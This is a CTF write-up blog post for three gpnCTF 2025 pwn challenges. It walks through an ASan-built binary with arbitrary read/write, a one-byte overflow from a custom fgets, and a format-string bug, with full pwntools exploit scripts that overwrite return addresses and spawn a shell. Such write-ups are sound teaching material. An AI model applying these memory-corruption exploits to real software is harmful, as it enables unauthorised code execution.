<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>gpnCTF25 | PwndSide</title><meta name=keywords content="pwn"><meta name=description content="The past 20th of June we had the luck to play the gpnCTF which is a Jeopardy-style Capture The Flag event organized annually by KITCTF, often taking place at the GPN (Goulash Programming Night) conference and also available to play online. This year’s had a fun twist it was based on a Monopoly-style board game, treating challenges like properties to be bought."><meta name=author content="Ayman Boulaich"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css integrity="sha256-j+ECM6cGvIfy4Is8+XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as=style><link rel=icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://pwndside.github.io/posts/gpnctf25/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://pwndside.github.io/posts/gpnctf25/"><meta property="og:site_name" content="PwndSide"><meta property="og:title" content="gpnCTF25"><meta property="og:description" content="The past 20th of June we had the luck to play the gpnCTF which is a Jeopardy-style Capture The Flag event organized annually by KITCTF, often taking place at the GPN (Goulash Programming Night) conference and also available to play online. This year’s had a fun twist it was based on a Monopoly-style board game, treating challenges like properties to be bought."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-07-06T19:26:52+02:00"><meta property="article:modified_time" content="2025-07-06T19:26:52+02:00"><meta property="article:tag" content="Pwn"><meta property="og:image" content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta name=twitter:title content="gpnCTF25"><meta name=twitter:description content="The past 20th of June we had the luck to play the gpnCTF which is a Jeopardy-style Capture The Flag event organized annually by KITCTF, often taking place at the GPN (Goulash Programming Night) conference and also available to play online. This year’s had a fun twist it was based on a Monopoly-style board game, treating challenges like properties to be bought."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://pwndside.github.io/posts/"},{"@type":"ListItem","position":2,"name":"gpnCTF25","item":"https://pwndside.github.io/posts/gpnctf25/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"gpnCTF25","name":"gpnCTF25","description":"The past 20th of June we had the luck to play the gpnCTF which is a Jeopardy-style Capture The Flag event organized annually by KITCTF, often taking place at the GPN (Goulash Programming Night) conference and also available to play online. This year’s had a fun twist it was based on a Monopoly-style board game, treating challenges like properties to be bought.","keywords":["pwn"],"articleBody":"I’m not gonna lie, writing CTF writeups just isn’t my thing.\nBut as an old proverb says: “If you didn’t write it, it didn’t happen.”\nSo today, I want to get back to one of the things I used to do early on.\nThe past 20th of June we had the luck to play the gpnCTF which is a Jeopardy-style Capture The Flag event organized annually by KITCTF, often taking place at the GPN (Goulash Programming Night) conference and also available to play online. This year’s had a fun twist it was based on a Monopoly-style board game, treating challenges like properties to be bought.\nKITCTF is the CTF team from the Karlsruhe Institute of Technology (KIT) in Germany. Founded in 2014, it’s composed of students, cybersecurity enthusiasts, and CTF players from the KIT community. They are also known for the famous KITCTFCTF and for participating in competitions as DEFCON CTF\nBefore anything else, just to give some context:\nI’m currently playing as part of the 418s CTF team.\nIt started as a place to casually play CTFs, but now we’re trying to turn it into something more competitive.\nAnd as a little spoiler, we’re not doing too bad! We’ve earned a respectable 62nd place in this competition, and that’s only the beginning.\nINDEX NASA Note Editor no-nc NASA The description shown above hints us that we are dealing with sanitizers but without further context I am unable to know which one is being used.\nldd shows the use of libasan which is the AddressSanitizer runtime library, part of a memory error detection tool built into compilers like Clang and GCC. It helps detect a wide range of memory-related bugs, like heap/stack overflows, use-after-free and use-after-return, also can be used to detect memory leaks.\nAll security checks are enabled.\nSo before getting through ASan sanitizations, lets break down the code.\nint main(void) { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); long long option; provide_help(\u0026option); while (1) { puts(\"[1] Write [2] Read [3] Exit\"); if (scanf(\"%llu\", \u0026option) != 1) break; if (option == 1) { puts(\"8-byte adress and 8-byte data to write please (hex)\"); uintptr_t addr; uint64_t val; scanf(\"%lx %lx\", \u0026addr, \u0026val); *((uint64_t *)addr) = val; } else if (option == 2) { puts(\"8-byte adress to read please (hex)\"); uintptr_t addr; scanf(\"%lx\", \u0026addr); printf(\"%lx\\n\", *((uint64_t *)addr)); } else if (option == 3) { puts(\":wave:\"); break; } else { puts(\"Invalid option\"); } } return 0; } The main function begins with a prologue function called provide_help, which leaks two addresses (win function address and a stack address). It is then followed by a loop presenting a contextual menu that allows you to read and write memory without any restrictions, as well as an exit option to break the loop.\nvoid provide_help(void *stack_ptr) { printf(\"%p\\n\", stack_ptr); printf(\"%p\\n\", \u0026win); } Moreover, there’s a win function that spawn a shell, so if we can control the flow, we’re good to go.\nvoid win() { puts(\"YOU WIN!!!\\n\"); system(\"/bin/sh\"); exit(0); } As we known the chall makes use of AddressSanitizer in compilation time so if we check the disassembled binary we could notice some changes on the main function.\nFirst thing that catch my eye is this comparison at startup checking if there is stack use-after-return detection enabled. As the binary takes the loc_14c4 path, we can confirm that is enabled.\nBut why is monitoring this vulnerability if our code is not vulnerable to it?\nvoid provide_help(void *stack_ptr) Returning to the provide_help function, it takes a stack address as an argument. As a preventive measure, if any function that handles stack addresses is detected, the stack will be allocated on the heap instead, allowing it to be monitored by the sanitizer.\nIn loc_139E some type of masking is done at a relative address to rbp.\nThis mask targets addresses on the heap-allocated stack, ASan maintains a shadow memory, where the mask is written, to track whether memory is valid or poisoned. Making sure no function reads or writes into the poisoned addresses.\nTo summarize, we have two crucial leaks: the address of the win function and a stack address (in this case, from the heap-allocated stack). Additionally, we have arbitrary read and write capabilities, as long as the target addresses aren’t poisoned. This is because the ASan mask only affects heap-allocated stack frames, which are the ones susceptible to stack use-after-return detection.\nBefore diving into the exploitation phase, I usually like to plan my approach.\nThe presence of a win function leak suggests that we have control over PIE, which we can leverage to leak the address of puts from the GOT. This leak will allow us to compute the base address of libc.\nFrom here, it’s a win-win case. With the libc base address, we can calculate the address of the environ pointer, which points to a stack address. This allows us to derive the return address of a function on the stack, and that’s what we’re going to overwrite in order to hijack the control flow.\nfrom pwn import * exe = ELF(\"./nasa\") libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h']) def start(argv=[], *a, **kw): if args.GDB: # GDB return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw) else: return remote(\"lakeforge-of-mind-blowing-hope.gpn23.ctf.kitctf.de\", \"443\", ssl=True) gdbscript = ''' disp/10i $rip tb main continue '''.format(**locals()) # Write primitive def write(addr, data): io.sendlineafter(b'[1] Write [2] Read [3] Exit\\n', b'1') io.recvuntil(b'8-byte adress and 8-byte data to write please (hex)\\n') io.sendline(addr) io.sendline(data) # Read primitive def read(addr): io.sendlineafter(b'[1] Write [2] Read [3] Exit\\n', b'2') io.recvuntil(b'8-byte adress to read please (hex)\\n') io.sendline(addr) return io.recvline().strip() # Exit primitive def exit(): io.sendlineafter(b'[1] Write [2] Read [3] Exit\\n', b'3') io = start() # Leak addresses asan_heap = int(io.recvline().strip(), 16) win_addr = int(io.recvline().strip(), 16) # Compute PIE exe.address = win_addr - 0x1309 log.info(f'exe base: {hex(exe.address)}') # Leak libc address puts_addr = read(hex(exe.got['puts'])) log.info(f'puts_addr: {hex(int(puts_addr, 16))}') # Compute libc base libc.address = int(puts_addr, 16) - 0x265a12 log.info(f'libc base: {hex(libc.address)}') # Leak stack address environ_addr = libc.symbols['environ'] log.info(f'environ_addr: {hex(environ_addr)}') # Compute return address rip_addr = int(read(hex(environ_addr)), 16) - 0x130 # Hijack the control flow write(hex(rip_addr), hex(win_addr + 0xa)) # Trigger the win function exit() io.interactive() GPNCTF{all_WR1te5_4Re_PrO7EcteD_By_AsaN_oN1Y_in_Y0UR_dreamS_9438}\nWrapping up, ASan is a debugging tool, not a security boundary. It helps developers catch bugs during testing, but it’s not reliable for protecting a binary against exploitation. Arbitrary read/write breaks the entire threat model that ASan operates under.\nNote Editor Not much to take away from this description but it seems to be some sort of note-taking app.\nEverything seems disabled wasn’t expecting less from an entry level challenge.\nFrom this line in the challenge’s Dockerfile, we can see that lib.c and main.c are compiled together into a single executable.\nRUN gcc lib.c main.c -o chall -fno-stack-protector -fno-pie -no-pie Once executed the following contextual menu is shown.\nWelcome to the terminal note editor as a service. Choose your action: 1. Reset note 2. View current note 3. Append line to note 4. Edit line at offset 5. Truncate note 6. Quit Let’s dig into the code.\nThe first thing I noticed was that lib.c overrides the standard fgets function with its own custom implementation. This is interesting, as it could introduce a specific vulnerability related to how fgets behaves, worth to mention that it does not null-terminate the string. Additionally, a win function is implemented, making it easier to hijack the control flow once code execution is achieved.\n#include #include char *fgets(char* s, int size, FILE *restrict stream) { char* cursor = s; for (int i = 0; i \u003c size -1; i++) { int c = getc(stream); if (c == EOF) break; *(cursor++) = c; if (c == '\\n') break; } // *cursor = '\\0'; // our note is always null terminated return s; } void win() { execve(\"/bin/sh\", NULL, NULL); } The following macro, which may appear in the code, reads an entire line from stdin using getline and parses it with sscanf according to the given format and arguments.\n#define SCANLINE(format, args) \\ ({ \\ char* __scanline_line = NULL; \\ size_t __scanline_length = 0; \\ getline(\u0026__scanline_line, \u0026__scanline_length, stdin); \\ sscanf(__scanline_line, format, args); \\ }) The key thing in main.c is the edit function, which takes a Note* struct as an argument. It prompts the user for an offset and a length, and is responsible for editing the note’s buffer starting at the given offset for up to length bytes. While some checks are performed on the user-controlled values, they are ultimately ineffective as fgets takes lenght + 2 bytes and does not explicitly null-terminate the last byte if the input length is large enough, potentially allowing a one-byte overflow past the end of the buffer.\nvoid edit(Note* note) { printf(\"Give me an offset where you want to start editing: \"); uint32_t offset; SCANLINE(\"%u\", \u0026offset); printf(\"How many bytes do you want to overwrite: \"); int64_t length; SCANLINE(\"%ld\", \u0026length); if (offset \u003c= note-\u003epos) { uint32_t lookback = (note-\u003epos - offset); if (length \u003c= note-\u003ebudget + lookback) { fgets(note-\u003ebuffer + offset, length + 2, stdin); // plus newline and null byte uint32_t written = strcspn(note-\u003ebuffer + offset, \"\\n\") + 1; if (written \u003e lookback) { note-\u003ebudget -= written - lookback; note-\u003epos += written - lookback; } } } else { printf(\"Maybe write something there first.\\n\"); } } #define NOTE_SIZE 1024 struct Note { char* buffer; size_t size; uint32_t budget; uint32_t pos; }; typedef struct Note Note; This vulnerability on its own isn’t particularly dangerous, but since the next item on the stack is the buffer pointer within the Note struct, it gives us the ability to overwrite one byte of that address, effectively letting us redirect where the note writes to.\nint main() { Note note; char buffer[NOTE_SIZE]; ..... more code ..... Alright, as usual, let’s outline a plan. We’ll start by editing the note from offset 0 up to NOTE_SIZE, which lets us modify a single byte of the note’s buffer pointer. This shift pushes the pointer further in memory, giving us the ability to freely overwrite the return address.\nThe next question is: How many bytes can we overwrite once the pointer has been shifted?\nThat depends on the stack layout, as the least significant byte of the buffer address varies between executions. The number of bytes we’re allowed to write ”our budget\" is determined by subtracting the current written and loopback value from the previous budget. This written value is computed using strcspn, which scans the buffer until it encounters a newline or, in our case, the first null byte at the end of the shifted buffer pointer. lookback represents how far the write pointer has been shifted backwards from the current logical position, in our case is zero.\nuint32_t written = strcspn(note-\u003ebuffer + offset, \"\\n\") + 1; uint32_t lookback = (note-\u003epos - offset); note-\u003ebudget -= written - lookback; Is worth to mention the actual position of the note is updated in a similar way\nnote-\u003epos += written - lookback; So once we got the buffer pointer shifted we can use the following function which is very handy which appends data at the end of the buffer, the only thing here to have care about is to put a null byte at the end of the buffer pointer.\nvoid append(Note* note) { printf(\"Append something to your note (%u bytes left):\\n\", note-\u003ebudget); fgets(note-\u003ebuffer + note-\u003epos, note-\u003ebudget, stdin); uint32_t written = strcspn(note-\u003ebuffer + note-\u003epos, \"\\n\") + 1; note-\u003ebudget -= written; note-\u003epos += written; } from pwn import * exe = ELF(\"./chall\") #libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h']) def start(argv=[], *a, **kw): if args.GDB: # GDB return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw) else: return remote(\"ironview-of-constant-abundance.gpn23.ctf.kitctf.de\", \"443\", ssl=True) gdbscript = ''' disp/10i $rip tb main continue '''.format(**locals()) def append(data): io.sendlineafter(b'6. Quit\\n', b'3') io.sendlineafter(b'Append something to your note', data) def edit(offset, length, data): io.sendlineafter(b'6. Quit\\n', b'4') io.sendlineafter(b'Give me an offset where you want to start editing: ', offset) io.sendlineafter(b'How many bytes do you want to overwrite: ', length) io.send(data) def exit(): io.sendlineafter(b'6. Quit\\n', b'6') io = start() edit(b'0', b'1024', b'A'*1024 + b'\\xff') append(b'\\x00' + p64(0x0)*3 + b'A'*0x10 + p64(exe.sym.win)) exit() io.interactive() GPNCTF{NOw_y0U_5uRE1y_are_REaDY_to_Pwn_14DyBird!}\nno-nc Only ASLR enabled this time.\n#include #include #include #include #include #define RAW_FLAG \"GPNCTF{fake_flag}\" char *FLAG = RAW_FLAG; First of all, the code defines a macro containing a hardcoded flag.\nLet’s breakdown the main function.\nint main(int argc, char **argv) { setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); char buf[200] = {}; puts(\"Give me a file to read\"); read(STDIN_FILENO, buf, (sizeof buf) - 1); buf[sizeof buf - 1] = '\\0'; The function starts by asking for a file name, which is then stored in the buf variable.\nsize_t str_len = strlen(buf); for (size_t i = 0; i \u003c str_len; i++) { if (no(buf[i])) { puts(\"I don't like your character!\"); exit(1); } } The no function is called in a loop over every character in the user-provided input buf , and if any disallowed character is found, the program exits.\nint no(char c) { if (c == '.') return 1; if (c == '/') return 1; if (c == 'n') return 1; if (c == 'c') return 1; return 0; } no is a character blacklist to limit how the file name can be constructed, likely as a weak form of input sanitization.\nchar *filename = calloc(200, 1); snprintf(filename, (sizeof filename) - 1, buf); // format string vuln puts(\"Will open:\"); puts(filename); A format string vulnerability is clearly present in the snprintf call, which uses the contents of buf directly as the format string when copying into filename. However, there is a limitation because the size argument passed to snprintf is incorrect as it returns the size of the pointer itself, not the allocated buffer, since filename is not dereferenced. This mistake restricts how much data snprintf can safely write.\nint fd = open(filename, 0); if (fd \u003c 0) { perror(\"open\"); exit(1); } while (1) { int count = read(fd, filebuf, (sizeof filebuf) - 1); if (count \u003e 0) { write(STDOUT_FILENO, filebuf, count); } else { break; } } } The function ends by opening the specified file and reading its content.\nAs is known in Linux EVERYHING is a file; regular files, executables, directories, and even devices are files, why not leak the content of the binnary itself to get the hardcoded flag.\nAs expected, the blacklist targets characters that make up the binary’s name.\nFrom here, I found two ways of bypassing the sanitization, both relying on the format string vulnerability.\nWhat is a format string vulnerability?\nA format string vulnerability is a type of security bug that occurs when an attacker is able to control the format string argument of a function like printf, sprintf, snprintf, or similar formatting functions in C/C++. You can learn more about format string vulnerabilities here\nEASY WAY Since argv[0] is a pointer to the executable name and the stack always has a reference to that pointer we could abuse the format string specifiers to bypass the sanitizer with $s.\nfrom pwn import * exe = ELF(\"./nc\") context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h']) def start(argv=[], *a, **kw): if args.GDB: # GDB return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw) else: return remote(\"mounttown-of-uncomfortably-powerful-unity.gpn23.ctf.kitctf.de\", \"443\", ssl=True) gdbscript = ''' disp/10i $rip tb main continue '''.format(**locals()) io = start() io.sendlineafter('Give me a file to read\\n', f\"%129$s\\0\") leaks = set(io.clean().split()) for leak in leaks: if b'GPN' in leak: log.info(f'Leak: {leak}') break io.interactive() HARD WAY As we have control of the format and the binary only sanitize characters before first null byte, we could try to construct the filename character by character abusing $C.\nfrom pwn import * exe = ELF(\"./nc\") context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h']) def start(argv=[], *a, **kw): if args.GDB: # GDB return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe.path] + argv, *a, **kw) gdbscript = ''' disp/10i $rip tb main continue '''.format(**locals()) io = start() io.sendlineafter('Give me a file to read\\n', f\"%11$C%12$C\\0\\0\\0\\0\\0\\0\\0\\0n\\0\\0\\0\\0\\0\\0\\0c\\0\\0\\0\\0\\0\\0\\0\") leaks = set(io.clean().split()) for leak in leaks: if b'GPN' in leak: log.info(f'Leak: {leak}') break io.interactive() GPNCTF{uP_AND_dowN_4Ll_4round_6oEs_7H3_N_dImEn51onAl_c1rClE_WTf_IS_Thi5_F14G}\n","wordCount":"2657","inLanguage":"en","image":"https://pwndside.github.io/%3Cimage%20path/url%3E","datePublished":"2025-07-06T19:26:52+02:00","dateModified":"2025-07-06T19:26:52+02:00","author":{"@type":"Person","name":"Ayman Boulaich"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://pwndside.github.io/posts/gpnctf25/"},"publisher":{"@type":"Organization","name":"PwndSide","logo":{"@type":"ImageObject","url":"https://pwndside.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://pwndside.github.io/ accesskey=h title="PwndSide (Alt + H)"><img src=https://pwndside.github.io/apple-touch-icon.png alt aria-label=logo height=35>PwndSide</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://pwndside.github.io/categories/hackthebox title=HackTheBox><span>HackTheBox</span></a></li><li><a href=https://pwndside.github.io/categories/ctf title="CTF's"><span>CTF's</span></a></li><li><a href=https://pwndside.github.io/about/whoami/ title=whoami><span>whoami</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://pwndside.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://pwndside.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">gpnCTF25</h1><div class=post-meta><span title='2025-07-06 19:26:52 +0200 CEST'>July 6, 2025</span>&nbsp;·&nbsp;13 min&nbsp;·&nbsp;2657 words&nbsp;·&nbsp;Ayman Boulaich&nbsp;|&nbsp;<a href=https://github.com/pwndside/pwndside.github.io/content/posts/gpnctf25.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=post-content><p><strong>I&rsquo;m not gonna lie, writing CTF writeups just isn&rsquo;t my thing.</strong></p><p>But as an old proverb says: <em>&ldquo;If you didn’t write it, it didn’t happen.&rdquo;</em></p><p>So today, I want to get back to one of the things I used to do early on.</p><p>The past 20th of June we had the luck to play the <strong>gpnCTF</strong> which is a Jeopardy-style Capture The Flag event organized annually by <strong>KITCTF</strong>, often taking place at the GPN (Goulash Programming Night) conference and also available to play online. This year’s had a fun twist it was based on a Monopoly-style board game, treating challenges like properties to be bought.</p><p><img alt=Untitled loading=lazy src=/CTF/gpnctf25-1.png></p><p><strong>KITCTF</strong> is the CTF team from the <strong>Karlsruhe Institute of Technology (KIT)</strong> in Germany. Founded in <strong>2014</strong>, it&rsquo;s composed of students, cybersecurity enthusiasts, and CTF players from the KIT community. They are also known for the famous <strong>KITCTFCTF</strong> and for participating in competitions as <strong>DEFCON CTF</strong></p><p>Before anything else, just to give some context:</p><p>I&rsquo;m currently playing as part of the <strong>418s</strong> CTF team.</p><p>It started as a place to casually play CTFs, but now we&rsquo;re trying to turn it into something more competitive.</p><p>And as a little spoiler, we’re not doing too bad! We’ve earned a respectable <strong>62nd place</strong> in this competition, and that’s only the beginning.</p><h2 id=index>INDEX<a hidden class=anchor aria-hidden=true href=#index>#</a></h2><ul><li><a href=https://pwndside.github.io/posts/gpnctf25/#nasa>NASA</a></li><li><a href=https://pwndside.github.io/posts/gpnctf25/#note-editor>Note Editor</a></li><li><a href=https://pwndside.github.io/posts/gpnctf25/#no-nc>no-nc</a></li></ul><h2 id=nasa>NASA<a hidden class=anchor aria-hidden=true href=#nasa>#</a></h2><p><img alt=Untitled loading=lazy src=/CTF/gpnctf25-2.png></p><p>The description shown above hints us that we are dealing with <strong>sanitizers</strong> but without further context I am unable to know which one is being used.</p><p><img alt=Untitled loading=lazy src=/CTF/gpnctf25-3.png></p><p><strong>ldd</strong> shows the use of <strong>libasan</strong> which is the <strong>AddressSanitizer runtime library</strong>, part of a memory error detection tool built into compilers like <strong>Clang</strong> and <strong>GCC</strong>. It helps detect a wide range of memory-related bugs, like heap/stack overflows, use-after-free and use-after-return, also can be used to detect memory leaks.</p><p><img alt=Untitled loading=lazy src=/CTF/gpnctf25-4.png></p><p>All security checks are enabled.</p><p>So before getting through <strong>ASan sanitizations</strong>, lets break down the code.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>_IONBF</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>_IONBF</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>setvbuf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>_IONBF</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>long</span> <span class=kt>long</span> <span class=n>option</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>provide_help</span><span class=p>(</span><span class=o>&amp;</span><span class=n>option</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>puts</span><span class=p>(</span><span class=s>&#34;[1] Write [2] Read [3] Exit&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%llu&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>option</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=n>option</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nf>puts</span><span class=p>(</span><span class=s>&#34;8-byte adress and 8-byte data to write please (hex)&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=kt>uintptr_t</span> <span class=n>addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=kt>uint64_t</span> <span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%lx %lx&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>addr</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>val</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=o>*</span><span class=p>((</span><span class=kt>uint64_t</span> <span class=o>*</span><span class=p>)</span><span class=n>addr</span><span class=p>)</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>option</span> <span class=o>==</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nf>puts</span><span class=p>(</span><span class=s>&#34;8-byte adress to read please (hex)&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=kt>uintptr_t</span> <span class=n>addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%lx&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>*</span><span class=p>((</span><span class=kt>uint64_t</span> <span class=o>*</span><span class=p>)</span><span class=n>addr</span><span class=p>));</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>option</span> <span class=o>==</span> <span class=mi>3</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nf>puts</span><span class=p>(</span><span class=s>&#34;:wave:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Invalid option&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The <code>main</code> function begins with a prologue function called <code>provide_help</code>, which leaks two addresses (win function address and a stack address). It is then followed by a loop presenting a contextual menu that allows you to read and write memory without any restrictions, as well as an exit option to break the loop.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>provide_help</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>stack_ptr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>stack_ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>win</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Moreover, there&rsquo;s a <code>win</code> function that spawn a shell, so if we can control the flow, we’re good to go.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>win</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nf>puts</span><span class=p>(</span><span class=s>&#34;YOU WIN!!!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
